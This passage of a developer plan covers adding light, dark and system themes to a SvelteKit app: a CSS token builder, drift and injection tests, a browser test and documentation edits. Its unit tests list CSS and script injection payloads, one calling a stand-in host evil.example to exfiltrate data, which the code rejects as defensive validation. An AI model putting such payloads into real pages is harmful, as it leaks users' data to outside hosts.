In `tests/unit/appearance-page-ssr.test.ts`, `5` → `6` at line 93, `3` → `4` at line 103, `5` → `6` at line 131. Add the new stored-value assertion beside the others at ~line 100:

```ts
expect(body).toMatch(/<option[^>]*value="light"[^>]*selected/);
```

and set `theme: "light"` on the fixture preferences row that file builds.

- [ ] **Step 7: Run everything**

Run: `npx vitest run && npm run check`
Expected: PASS / 0 errors. `tests/unit/appearance-actions.test.ts`, `appearance-registry.test.ts`, `appearance-schema.test.ts`, `preference-door-conformance.test.ts` and `app-action-auth-guard.test.ts` all enumerate the registry, so they pick the new key up automatically — if any of them hardcodes a count, update it and note which.

- [ ] **Step 8: Verify the migration under PGlite**

`tests/unit/helpers/pg-db.ts:17` applies the real `drizzle/` folder, so this is already covered:

Run: `npx vitest run tests/unit/pg/preferences.test.ts tests/unit/pg/preferences-audit.test.ts`
Expected: PASS — proving 0018 applies cleanly and the column round-trips.

- [ ] **Step 9: Commit**

```bash
git add src/lib/server/db/schema.ts drizzle/ src/lib/appearance/ "src/routes/(app)/settings/appearance/+page.svelte" tests/unit/appearance-page-ssr.test.ts
git commit -m "feat(theme): add the theme preference across the column, registry and three doors"
```

---

### Task 5: The theme `<style>` builder and its drift test

**Files:**

- Create: `src/lib/appearance/theme-css.ts`
- Create: `tests/unit/theme-css.test.ts`

**Interfaces:**

- Produces: `type ThemeName = "light" | "dark" | "system"`; `LIGHT_TOKENS`, `DARK_TOKENS`, `HC_LIGHT_TOKENS`, `HC_DARK_TOKENS` (all `Record<string, string>`); `buildThemeStyle(theme: ThemeName, accentColor: string): string`.
- Consumes: `readableInk`, `INK_BACKDROP`, `INK_BACKDROP_LIGHT`, `READABLE_LIGHT`, `READABLE_DARK` from Task 1.

**Design notes the implementer must not re-decide:**

- The two token tables carry **only the keys that differ between schemes** — the same key set. For `theme: "dark"` the block re-asserts the dark values, because the layered light arm may otherwise be in force on a light OS.
- `DARK_TOKENS` values must equal the `@theme` values for those keys. The drift test pins all of it.
- The block is `:root:root` (specificity 0,2,0) and **unlayered**, so it beats both the `@layer theme` arms and any unlayered `:root` rule regardless of head order.

- [ ] **Step 1: Write the failing tests**

Create `tests/unit/theme-css.test.ts`:

```ts
// @vitest-environment node
import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import {
  buildThemeStyle,
  LIGHT_TOKENS,
  DARK_TOKENS,
  HC_LIGHT_TOKENS,
  HC_DARK_TOKENS,
} from "$lib/appearance/theme-css";

const CSS = readFileSync(fileURLToPath(new URL("../../src/app.css", import.meta.url)), "utf8");

describe("the TS tables cannot drift from app.css", () => {
  // The palette exists twice on purpose: as CSS for `system` and the
  // logged-out routes, and as TS for the explicit choices. Neither
  // generates the other, so this is what stops them diverging — without
  // it, a user on `light` and a user on `system` with a light OS would
  // render different colours from the same deploy.
  it("declares the same key set for both schemes", () => {
    expect(Object.keys(LIGHT_TOKENS).sort()).toEqual(Object.keys(DARK_TOKENS).sort());
    expect(Object.keys(HC_LIGHT_TOKENS).sort()).toEqual(Object.keys(HC_DARK_TOKENS).sort());
  });

  it("emits dark values that match the @theme block", () => {
    for (const [token, value] of Object.entries(DARK_TOKENS)) {
      expect(CSS).toMatch(new RegExp(`${token}:\\s*${escapeRe(value)};`));
    }
  });

  it("emits light values that match the app.css light arm", () => {
    const arm = CSS.slice(CSS.indexOf("@media (prefers-color-scheme: light)"));
    for (const [token, value] of Object.entries(LIGHT_TOKENS)) {
      expect(arm).toMatch(new RegExp(`${token}:\\s*${escapeRe(value)};`));
    }
  });
});

describe("buildThemeStyle", () => {
  it("never emits a literal closing style tag from its own source", () => {
    const css = buildThemeStyle("dark", "#4f46e5");
    expect(css.startsWith("<style")).toBe(true);
    expect(css.endsWith("</style>")).toBe(true);
    expect(css.match(/<\/style>/g)).toHaveLength(1);
  });

  it("emits both arms behind media queries for system", () => {
    const css = buildThemeStyle("system", "#4f46e5");
    expect(css).toContain("@media (prefers-color-scheme: light)");
    expect(css).toContain("@media (prefers-color-scheme: dark)");
  });

  it("emits exactly one arm for an explicit choice", () => {
    expect(buildThemeStyle("light", "#4f46e5")).not.toContain("prefers-color-scheme");
    expect(buildThemeStyle("dark", "#4f46e5")).not.toContain("prefers-color-scheme");
  });

  it("uses :root:root so it outranks the unlayered contrast block", () => {
    expect(buildThemeStyle("light", "#4f46e5")).toContain(":root:root");
  });

  // CSP does not cover CSS injection. A value containing `</style>` breaks
  // out of the element, and a pure-CSS payload needs no tag break at all —
  // `#fff} body{background-image:url(https://evil.example/leak)} :root{`
  // produced a real outbound request under this app's img-src.
  it.each([
    "</style><script>alert(1)</script>",
    "#fff} body{display:none;} :root{",
    "#fff} body{background-image:url(https://evil.example/leak?t=x)} :root{",
    "#abc",
    "red",
  ])("refuses to interpolate a non-6-digit-hex accent: %s", (bad) => {
    const css = buildThemeStyle("dark", bad);
    expect(css).not.toContain(bad);
    // Still exactly one element, and the ink is a real hex derived from the
    // fallback rather than anything the caller supplied.
    expect(css.match(/<\/style>/g)).toHaveLength(1);
    expect(css).toMatch(/--color-accent-ink: #[0-9a-f]{6};/);
  });

  it("falls back rather than throwing on an empty accent", () => {
    expect(buildThemeStyle("dark", "")).toMatch(/--color-accent-ink: #[0-9a-f]{6};/);
  });

  it("derives a different ink per scheme from the same accent", () => {
    const css = buildThemeStyle("system", "#f59e0b");
    expect(css).toContain("#8c5d0e"); // darkened for light
    expect(css).not.toContain("--color-accent-ink: #f59e0b");
  });
});

function escapeRe(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}
```

- [ ] **Step 2: Run and watch it fail**

Run: `npx vitest run tests/unit/theme-css.test.ts`
Expected: FAIL — cannot resolve `$lib/appearance/theme-css`.

- [ ] **Step 3: Implement the module**

Create `src/lib/appearance/theme-css.ts`:

```ts
/**
 * The theme `<style>` block emitted from `(app)/+layout.svelte`.
 *
 * NO ZOD — a `.svelte` file imports this, so it is bound by
 * tests/unit/appearance-bundle-boundary.test.ts along with `registry.ts`.
 *
 * Why a string and not a component: the literal characters `</style>` in a
 * `.svelte` file break `npm run check` ("<script> was left open"), and in
 * dev vite-plugin-svelte's `code.lastIndexOf('</style>')` HMR hack appends a
 * stray ` *{}` to the CSS. Built here with the closing tag split instead.
 *
 * Why `:root:root` and not `:root`: specificity (0,2,0) beats the unlayered
 * `prefers-contrast` overrides in app.css regardless of head order. Measured
 * on the real build, SSR puts this block at head index 24 and the stylesheet
 * link at 25, while a client-side navigation appends it at 41 against a
 * stylesheet at 23 — so at equal specificity the winner FLIPS between a hard
 * load and a client nav, and a plain F5 changes the palette.
 *
 * The tables below carry only the tokens that DIFFER between schemes, and
 * both carry the same key set. `theme: "dark"` still emits them, because a
 * dark-preferring user on a light OS would otherwise be left on the layered
 * light arm. tests/unit/theme-css.test.ts pins every value against app.css.
 */
import {
  readableInk,
  INK_BACKDROP,
  INK_BACKDROP_LIGHT,
  READABLE_LIGHT,
  READABLE_DARK,
} from "$lib/utils/contrast";

export type ThemeName = "light" | "dark" | "system";

export const DARK_TOKENS: Record<string, string> = {
  "--color-glass": "rgba(255, 255, 255, 0.08)",
  "--color-glass-border": "rgba(255, 255, 255, 0.12)",
  "--color-glass-hover": "rgba(255, 255, 255, 0.14)",
  "--color-border-strong": "rgba(255, 255, 255, 0.34)",
  "--color-surface": "#0a0a0f",
  "--color-surface-raised": "#12121a",
  "--color-surface-overlay": "#1a1a25",
  "--color-text-primary": "#f0f0f5",
  "--color-text-secondary": "#c3c3d4",
  "--color-text-muted": "#9a9aac",
  "--color-accent-hover": "#4338ca",
  "--color-success": "#10b981",
  "--color-success-fg": "#111111",
  "--color-warning": "#f59e0b",
  "--color-warning-fg": "#111111",
  "--color-danger": "#ef4444",
  "--color-danger-fg": "#111111",
  "--color-danger-ink": "#f98686",
  "--color-info": "#a5a8f8",
  "--color-heatmap-0": "#1b2b2e",
  "--color-heatmap-1": "#1e5a56",
  "--color-heatmap-2": "#22867c",
  "--color-heatmap-3": "#2bb3a0",
  "--color-heatmap-4": "#54e0c4",
};

export const LIGHT_TOKENS: Record<string, string> = {
  "--color-glass": "rgba(255, 255, 255, 0.72)",
  "--color-glass-border": "rgba(0, 0, 0, 0.14)",
  "--color-glass-hover": "rgba(255, 255, 255, 0.4)",
  "--color-border-strong": "rgba(0, 0, 0, 0.46)",
  "--color-surface": "#eef0f6",
  "--color-surface-raised": "#ffffff",
  "--color-surface-overlay": "#e2e5ee",
  "--color-text-primary": "#14141c",
  "--color-text-secondary": "#4c4c63",
  "--color-text-muted": "#5c5c72",
  "--color-accent-hover": "#4338ca",
  "--color-success": "#036b4e",
  "--color-success-fg": "#ffffff",
  "--color-warning": "#7f5300",
  "--color-warning-fg": "#ffffff",
  "--color-danger": "#b41f17",
  "--color-danger-fg": "#ffffff",
  "--color-danger-ink": "#b41f17",
  "--color-info": "#3a44c4",
  "--color-heatmap-0": "#e4e7ee",
  "--color-heatmap-1": "#8fd0c1",
  "--color-heatmap-2": "#4fb3a0",
  "--color-heatmap-3": "#22907c",
  "--color-heatmap-4": "#0c6455",
};

/**
 * Four tokens, where `app.css`'s block overrides five.
 *
 * `--color-accent` is deliberately absent from both HC tables. Inside (app)
 * the layout sets it inline on the wrapper from the user's stored hex, and
 * an inline style beats this block — so a high-contrast override here would
 * be dead code. The app.css copy keeps it because that copy is what serves
 * the logged-out routes, where nothing is set inline.
 */
export const HC_DARK_TOKENS: Record<string, string> = {
  "--color-text-muted": "#ababba",
  "--color-text-secondary": "#d4d4e0",
  "--color-glass-border": "rgba(255, 255, 255, 0.24)",
  "--color-border-strong": "rgba(255, 255, 255, 0.5)",
};

export const HC_LIGHT_TOKENS: Record<string, string> = {
  "--color-text-muted": "#43435a",
  "--color-text-secondary": "#3a3a4d",
  "--color-glass-border": "rgba(0, 0, 0, 0.26)",
  "--color-border-strong": "rgba(0, 0, 0, 0.66)",
};

/**
 * Re-validated AT the interpolation site, not only at the form door.
 * Deliberately stricter than `contrast.ts`'s HEX_RE, which also accepts the
 * 3-digit form, and stricter than the column, which is a bare `text()` with
 * no CHECK — a row written by a pre-1b import can hold anything.
 */
const STRICT_HEX = /^#[0-9a-f]{6}$/i;
const FALLBACK_ACCENT = "#4f46e5";

const SCHEMES = {
  dark: {
    colorScheme: "dark",
    tokens: DARK_TOKENS,
    contrast: HC_DARK_TOKENS,
    inkBackdrop: INK_BACKDROP,
    inkOverlay: READABLE_LIGHT,
  },
  light: {
    colorScheme: "light",
    tokens: LIGHT_TOKENS,
    contrast: HC_LIGHT_TOKENS,
    inkBackdrop: INK_BACKDROP_LIGHT,
    inkOverlay: READABLE_DARK,
  },
} as const;

function declarations(tokens: Record<string, string>, indent: string): string {
  return Object.entries(tokens)
    .map(([k, v]) => `${indent}${k}: ${v};`)
    .join("\n");
}

/** One scheme's `:root:root` rule plus its high-contrast override. */
function arm(scheme: keyof typeof SCHEMES, accent: string, indent: string): string {
  const s = SCHEMES[scheme];
  const ink = readableInk(accent, { backdrop: s.inkBackdrop, overlay: s.inkOverlay });
  const body = [
    `${indent}  color-scheme: ${s.colorScheme};`,
    declarations(s.tokens, `${indent}  `),
    `${indent}  --color-accent-ink: ${STRICT_HEX.test(ink) ? ink : s.inkOverlay};`,
  ].join("\n");
  return [
    `${indent}:root:root {`,
    body,
    `${indent}}`,
    `${indent}@media (prefers-contrast: more) {`,
    `${indent}  :root:root {`,
    declarations(s.contrast, `${indent}    `),
    `${indent}  }`,
    `${indent}}`,
  ].join("\n");
}

/**
 * The whole `<style>` element, ready for `{@html}`.
 *
 * Only the whole-element `{@html}` form works — `<style>{@html css}</style>`
 * emits the literal text `{@html css}` into the stylesheet. Measured.
 */
export function buildThemeStyle(theme: ThemeName, accentColor: string): string {
  const accent = STRICT_HEX.test(accentColor) ? accentColor : FALLBACK_ACCENT;
  const css =
    theme === "system"
      ? [
          "@media (prefers-color-scheme: dark) {",
          arm("dark", accent, "  "),
          "}",
          "@media (prefers-color-scheme: light) {",
          arm("light", accent, "  "),
          "}",
        ].join("\n")
      : arm(theme, accent, "");
  return `<style id="theme-tokens">\n${css}\n</` + `style>`;
}
```

- [ ] **Step 4: Run**

Run: `npx vitest run tests/unit/theme-css.test.ts`
Expected: PASS.

- [ ] **Step 5: Prove the drift test bites**

Change `LIGHT_TOKENS["--color-surface"]` to `#eeeeee`. Re-run. Expected: FAIL on "emits light values that match the app.css light arm". Revert.

- [ ] **Step 6: Prove the injection guard bites**

Change `STRICT_HEX.test(accentColor) ? accentColor : FALLBACK_ACCENT` to just `accentColor`. Re-run. Expected: the six `refuses to interpolate` cases FAIL. Revert.

- [ ] **Step 7: Confirm the bundle boundary still holds**

Run: `npx vitest run tests/unit/appearance-bundle-boundary.test.ts`
Expected: PASS — `theme-css.ts` imports only `$lib/utils/contrast`, which is zod-free.

- [ ] **Step 8: Commit**

```bash
git add src/lib/appearance/theme-css.ts tests/unit/theme-css.test.ts
git commit -m "feat(theme): build the per-scheme style block with a drift test against app.css"
```

---

### Task 6: Emit the block from the `(app)` layout

The inline `--color-accent-ink` must be **deleted in the same commit** the block starts emitting it. Landing the block alone is a no-op (an inline style on the wrapper beats `:root:root`); landing the deletion alone drops 173 sites back to the `@theme` fallback.

**Files:**

- Modify: `src/routes/(app)/+layout.svelte:5, 17-23, 26-28, 30-36`

**Interfaces:**

- Consumes: `buildThemeStyle` from Task 5.
- Produces: nothing importable; `--color-accent` and `--color-accent-fg` remain inline on the wrapper.

- [ ] **Step 1: Wire it up**

In `src/routes/(app)/+layout.svelte`, change the import at line 5 and the derivations at 21-23:

```ts
import { readableForeground } from "$lib/utils/contrast";
import { buildThemeStyle, type ThemeName } from "$lib/appearance/theme-css";
```

```ts
// accent and accent-fg stay INLINE: both are scheme-independent (the fill
// is the user's stored hex, and the foreground is derived from the fill
// alone). accent-ink does NOT — it has to be re-derived per scheme, and an
// inline style on this wrapper would outrank the theme block for the whole
// subtree, which is the exact trap spec decision 4 was written to avoid.
const accentColor = $derived(data.preferences.accentColor);
const accentFgColor = $derived(readableForeground(accentColor).color);
const themeStyle = $derived(buildThemeStyle(data.preferences.theme as ThemeName, accentColor));
```

Replace the `<svelte:head>` block:

```svelte
<svelte:head>
  <meta name="robots" content="noindex, nofollow" />
  <!-- eslint-disable-next-line svelte/no-at-html-tags -->
  {@html themeStyle}
</svelte:head>
```

And drop line 33 from the wrapper, leaving:

```svelte
<div
  style:--color-accent={accentColor}
  style:--color-accent-fg={accentFgColor}
  data-density={data.preferences.uiDensity}
  data-reduced-motion={data.preferences.reducedMotion ? "true" : "false"}
>
```

`data-density` and `data-reduced-motion` **stay** — see Global Constraints.

- [ ] **Step 2: Typecheck and build**

Run: `npm run check`
Expected: 0 errors. If svelte-check reports "`<script>` was left open", the closing tag was not split in `theme-css.ts`.

```bash
DATABASE_URL='postgresql://placeholder:placeholder@placeholder/placeholder?sslmode=require' npm run build
```

- [ ] **Step 3: Confirm the block reaches the SSR'd head**

Start the dev server and load an authenticated page, or grep the built server output:

```bash
rg -o 'theme-tokens' .svelte-kit/output/server/index.js | head -1
```

Expected: a match. Then in a browser at `/dashboard`, confirm `document.querySelector('#theme-tokens')` exists and switching the control repaints without a hard load.

- [ ] **Step 4: Run everything**

Run: `npx vitest run && npx vitest run tests/unit/appearance-page-ssr.test.ts`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add "src/routes/(app)/+layout.svelte"
git commit -m "feat(theme): emit the theme block from the app layout and retire the inline ink"
```

---

### Task 7: Browser regression test for the SSR/CSR divergence

Decision 3 exists solely for a failure unit tests cannot see: at equal specificity the winner between the theme block and the `prefers-contrast` block flips between a hard load and a client-side navigation. **A new `tests/e2e/theme.test.ts` matches neither project's `testMatch` and would report zero tests and exit 0** — the regex must be extended or this ships dead.

**Files:**

- Create: `tests/e2e/theme.test.ts`
- Modify: `playwright.config.ts:22` (the `anon` project's `testMatch`)
- Modify: `scripts/seed-e2e.ts:136-150`

- [ ] **Step 1: Extend `testMatch` first, and prove it runs**

In `playwright.config.ts`, change the `anon` project's regex:

```ts
      testMatch: /(auth|smoke|accessibility|theme)\.test\.ts$/,
```

- [ ] **Step 2: Fix the stale seeded accent**

`scripts/seed-e2e.ts:138` hardcodes `accentColor: "#6366f1"` — the pre-1a value that measures 4.47:1 and that `drizzle/0017_free_black_panther.sql` backfills away. The seed re-creates it after the migration on every run, so the axe user is the one account still on the accent 1a deleted. Change it to `"#4f46e5"`. Do this **before** Task 8, or the light-mode scan gates on a 1a bug and reads as a 1c regression.

- [ ] **Step 3: Write the test**

Create `tests/e2e/theme.test.ts`:

```ts
import { test, expect, type Page } from "@playwright/test";
import { login, SEEDED_EMAIL, SEEDED_PASSWORD } from "./helpers/auth";

/**
 * The `:root:root` specificity fix exists for a divergence no unit test can
 * see: on the SSR path SvelteKit emits rendered head content BEFORE
 * stylesheet links, so at equal specificity the stylesheet's unlayered
 * `prefers-contrast` block wins; on a client-side navigation Svelte appends
 * the theme block after it, and the theme wins. Same user, same URL — a
 * plain F5 used to flip the palette, and on the SSR path the losing side was
 * the accessible one.
 */
const token = (page: Page, name: string) =>
  page.evaluate((n) => getComputedStyle(document.documentElement).getPropertyValue(n).trim(), name);

test.describe("theme resolution", () => {
  test.use({ contrast: "more" });

  test("resolves the same token on a hard load and a client-side nav", async ({ page }) => {
    await login(page, SEEDED_EMAIL, SEEDED_PASSWORD);

    await page.goto("/dashboard");
    const onLoad = await token(page, "--color-text-secondary");

    await page.goto("/medications");
    await page
      .getByRole("link", { name: /dashboard/i })
      .first()
      .click();
    await expect(page).toHaveURL(/\/dashboard/);
    const onNav = await token(page, "--color-text-secondary");

    expect(onLoad).toBe(onNav);
    // The high-contrast arm must win over the base, in both directions.
    expect(onLoad).toBe("#d4d4e0");
  });

  test("an explicit light theme beats a dark OS preference", async ({ page }) => {
    await login(page, SEEDED_EMAIL, SEEDED_PASSWORD);
    await page.goto("/settings/appearance");
    await page.selectOption("#theme", "light");
    await expect(page.locator("#theme")).toHaveValue("light");

    await page.emulateMedia({ colorScheme: "dark", contrast: "no-preference" });
    await page.goto("/dashboard");

    // Asserted as a resolved token, not as an attribute: nothing in the app
    // sets data-theme, so the computed value IS the observable.
    expect(await token(page, "--color-surface")).toBe("#eef0f6");
  });
});
```

- [ ] **Step 4: Run it**

```bash
RUN_E2E=true npx playwright test tests/e2e/theme.test.ts --project=anon
```

Expected: 2 passed. **If it reports "0 tests", the `testMatch` edit did not take** — that is the failure this task exists to prevent.

- [ ] **Step 5: Prove it bites**

Temporarily change `:root:root` to `:root` in `theme-css.ts`'s `arm()`. Re-run. Expected: the first test FAILS on the hard-load value. Revert.

- [ ] **Step 6: Commit**

```bash
git add tests/e2e/theme.test.ts playwright.config.ts scripts/seed-e2e.ts
git commit -m "test(theme): pin the SSR/CSR specificity fix in a browser"
```

---

### Task 8: Light-mode axe scan

`tests/e2e/accessibility.test.ts` **already** surfaces `results.incomplete` (`:24`, filtered to `color-contrast`) and **already** visits `/settings/appearance` (`:69-71`). The spec's two asks under §Testing are therefore done; this task is only the light-mode pass.

**Expect the light run to convert existing `incomplete` results into `serious` violations across the 26 `backdrop-blur` surfaces.** That is axe finally being _able_ to compute a backdrop, not a 1c regression — say so in the PR body before a reviewer reads it as one.

**Files:**

- Modify: `scripts/seed-e2e.ts` (a second user)
- Modify: `tests/e2e/accessibility.test.ts`

- [ ] **Step 1: Seed a second user rather than mutating the shared row**

`playwright.config.ts` sets no `workers: 1`, so flipping the theme on the shared seeded row pollutes concurrently running tests. Add a second user alongside the existing one in `scripts/seed-e2e.ts`, identical except `theme: "light"`, and export its credentials the way the first one is exported.

- [ ] **Step 2: Add the scan**

Extend `tests/e2e/accessibility.test.ts` with a light-mode pass over the same route list, logging in as the new user. Assert the resolved theme **first**, so the test cannot pass in the wrong mode:

```ts
test.beforeEach(async ({ page }) => {
  await loginAs(page, LIGHT_USER);
  await page.goto("/dashboard");
  const surface = await page.evaluate(() =>
    getComputedStyle(document.documentElement).getPropertyValue("--color-surface").trim(),
  );
  expect(surface, "the light-mode scan is running in dark mode").toBe("#eef0f6");
});
```

- [ ] **Step 3: Run**

```bash
RUN_E2E=true npx playwright test tests/e2e/accessibility.test.ts --project=anon
```

Triage every new `serious` result: fix it if 1c caused it, and record it in the PR body if it is a pre-existing dark-mode failure the opaque palette merely made computable.

- [ ] **Step 4: Confirm the CI gate is actually on**

The e2e job is gated on `vars.RUN_E2E == 'true'`. Check the repo variable before counting any of this as coverage:

```bash
gh variable list
```

If it is unset, say so in the PR body — the suite exists but does not run.

- [ ] **Step 5: Commit**

```bash
git add tests/e2e/accessibility.test.ts scripts/seed-e2e.ts
git commit -m "test(a11y): scan the light palette with a dedicated seeded user"
```

---

### Task 9: Docs, and correcting the two things 1c disproved

**Files:**

- Modify: `docs/superpowers/specs/2026-09-06-appearance-customization-design.md`
- Modify: `src/lib/appearance/registry.ts:31-42`
- Modify: `CLAUDE.md`, `docs/api-v1-contract.md`, `docs/database.md`, `CHANGELOG.md`, `svelte.config.js`

- [ ] **Step 1: Correct the `data-attribute` claim in the registry**

`registry.ts:34-36` says 1c moves the data attributes onto the theme `<style>` block. Replace with:

```ts
 * The data-attribute bindings are set on the `(app)` wrapper div
 * (`(app)/+layout.svelte:34-35`) and STAY there. 1c planned to move them
 * onto the theme `<style>` block and could not: `Heatmap.svelte:123`
 * compiles to `[data-reduced-motion="true"] .heatmap-cell.svelte-<hash>`,
 * and the hash is content-derived, so no externally-emitted stylesheet can
 * target it. The invariant that replaces the move: the theme block emits
 * only colour tokens and `color-scheme`, while these rules set only spacing
 * and animation timing — disjoint, so the wrapper being a descendant of
 * `:root` does not matter.
```

- [ ] **Step 2: Correct the spec**

Three edits, each recording something 1c measured:

1. §1c "**`data-density` and `data-reduced-motion` move off the wrapper div…**" — replace with the finding above, including the compiled selector as evidence.
2. Decision 5 says the contrast block overrides "four tokens"; it is **five** since 1a added `--color-border-strong`.
3. Decision 4 still names `--color-accent-text` at `spec:215`. The back-reference added in the 1c section is enough, but if you touch that paragraph, rename it.

Add a short note to §1c recording the layer finding: `@layer theme` is Tailwind's **lowest** layer, so `color-scheme` had to move out of `@layer base` for the light arm to reach it.

- [ ] **Step 3: `CLAUDE.md`**

Add to the Styling section:

```markdown
- **The theme is an SSR `<style id="theme-tokens">` block emitted from `(app)/+layout.svelte`, at `:root:root` specificity.** Three parts are load-bearing and none is stylistic. **`:root:root` (0,2,0)** beats the unlayered `prefers-contrast` overrides regardless of head order — at equal specificity the winner flips between an SSR load (Kit emits head content before stylesheet links) and a client-side nav (Svelte appends after), so a plain F5 changed the palette, and on the SSR path the losing side was the accessible one. **The block is built in `src/lib/appearance/theme-css.ts`, not inline**, because the literal characters `</style>` in a `.svelte` file break `npm run check`; the closing tag is split. **`{@html}` applies zero escaping and CSP does not cover CSS injection** — a pure-CSS payload needs no tag break to exfiltrate via `background-image: url(...)` under our `img-src`, so the accent is re-tested against `/^#[0-9a-f]{6}$/i` at the interpolation site, stricter than `contrast.ts`'s `HEX_RE` (which takes 3-digit hex) and stricter than the column (a bare `text()`).
- **The palette exists twice and neither copy generates the other**: `@layer theme` in `app.css` serves `system` and every logged-out route; `LIGHT_TOKENS`/`DARK_TOKENS` in `theme-css.ts` serve the explicit choices. `tests/unit/theme-css.test.ts` asserts they are identical. **`@layer theme` is Tailwind's LOWEST layer** (`@layer theme, base, components, utilities;`), which is what lets the unlayered SSR block win — and is why `color-scheme` had to move out of `@layer base`, since `base` outranks `theme` and a layered light arm could never have overridden it.
- **`data-density` and `data-reduced-motion` stay on the `(app)` wrapper div.** They cannot move to the theme block: `Heatmap.svelte`'s override targets a Svelte-scoped `.heatmap-cell.svelte-<hash>`, and the hash is content-derived. The theme block emits only colour tokens and `color-scheme`; these set only spacing and animation timing. Disjoint by construction — keep it that way.
```

- [ ] **Step 4: `svelte.config.js`**

Add the comment the spec requires next to `style-src`:

```js
      // LOAD-BEARING: the theme <style> block is emitted inline from
      // (app)/+layout.svelte. SvelteKit's style_needs_csp() returns early
      // when a directive already contains 'unsafe-inline', so Kit adds
      // neither nonce nor hash here. Rebuilt with ['self'] the element is
      // still inserted but NOT applied — the page silently reverts to the
      // compiled dark default and only a console message says so.
      "style-src": ["self", "unsafe-inline"],
```

- [ ] **Step 5: `docs/api-v1-contract.md` and `docs/database.md`**

Add `theme` (`"dark" | "light" | "system"`, default `"dark"`) to the `user_preferences`
section of `docs/database.md`, and to **three** specific places in `docs/api-v1-contract.md`
that Task 4's review pinned down:

1. `:343-362` — the `SerializedPreferences` wire-contract type block gains `theme: string;`.
2. `:364-369` — the explanatory note says "The four enum-valued fields … narrows only three
   of them (`dateFormat`, `timeFormat`, `uiDensity`)". Both counts are now wrong: there are
   **five** enum-valued fields and **four** are narrowed, `theme` joining the other three.
3. `:443` — §4's `update_preferences` field list omits `theme`.

While in the area, sweep the stale "the five appearance options" / "the appearance five"
comments, which are six post-Task-4: `src/lib/preferences/schema.ts:13,19`,
`src/lib/utils/validation.ts:362`, `tests/unit/preference-door-conformance.test.ts:108`. Both are hand-written restatements with no compiler coupling, and `docs/api-v1-contract.md` is published to the separate `medtracker-mac` repo — a missing field there means an older Mac client silently drops the setting.

- [ ] **Step 6: `CHANGELOG.md`**

Under `## [Unreleased]` → `### Added`:

```markdown
- Light, dark and system themes. `system` needs no JavaScript — it is a `prefers-color-scheme` block in the stylesheet — while an explicit choice is delivered as a server-rendered `<style>` block scoped to the signed-in app. Existing accounts default to `dark`, so nothing changes for anyone who does not go looking for it. The light palette is authored against measured contrast rather than picked by eye: every foreground clears 4.5:1 on each of the six surfaces it actually renders on, including its own tinted chips, and a unit test asserts both schemes against the real stylesheet. `/auth/*` and the landing page follow the device setting rather than the stored one, which for a shared or signed-out browser is the better answer.
```

- [ ] **Step 7: Final verification**

```bash
npx vitest run && npm run check && npx prettier --check . && npx eslint .
DATABASE_URL='postgresql://placeholder:placeholder@placeholder/placeholder?sslmode=require' npm run build
```

Expected: all green, `npm run check` 0 errors.

- [ ] **Step 8: Commit**

```bash
git add -A
git commit -m "docs(theme): record the theme mechanism's invariants and correct two spec claims"
```

---

## Known limitations to state in the PR body

Not defects; each is a decision, and a reviewer who does not see it listed will read it as an oversight.

- **`/auth/*`, `/` and `src/routes/+error.svelte` follow the device, not the stored preference.** They render outside `(app)`, so the SSR block never reaches them — decision 2's accepted cost. `+error.svelte` is the sharp one: it is what an authenticated user sees when `(app)/+layout.server.ts` itself fails.
- **`static/manifest.json`'s `background_color` cannot vary per user.** It stays at the dark surface, so a light-mode user gets a brief splash mismatch. While in that file, note that `theme_color` is still `#6366f1`, two accent versions stale.
- **Tailwind bakes the literal `@theme` hex into the non-`@supports` fallback of every alpha-modifier utility** (`background-color: color-mix(in srgb, #4f46e5 15%, transparent)`). Only the `var()` arm re-tunes per scheme, so browsers without `color-mix(in lab, …)` — pre-Chrome 111, pre-Safari 16.2, pre-Firefox 113 — render dark-mode tints on the light page across ~100 utilities.
- **The theme control saves after a 400ms debounce plus a round trip**, so a full-page repaint lags the click. No optimistic update; the spec defers live preview to a later phase.
- **`reducedMotion` → `motionLevel`** stays out of scope; the migration shape is recorded in the spec's §"Out of scope" and has a no-dual-write requirement worth re-reading before anyone starts it.

## Self-review notes

Spec coverage was checked section by section. Two spec requirements are deliberately **not** implemented and are corrected instead, both because 1c disproved them: the `data-density`/`data-reduced-motion` move (Task 9, blocked by Svelte's scoped-class hashing) and the "new tokens" list (already shipped in 1a — the spec was updated ahead of this plan). One spec claim is implemented in a different place than written: decision 5's `contrastMore` set lives in _both_ the SSR table and `app.css`, because the app.css copy is the only one that reaches logged-out routes, and removing it there would have regressed them from wrong high-contrast values to none.
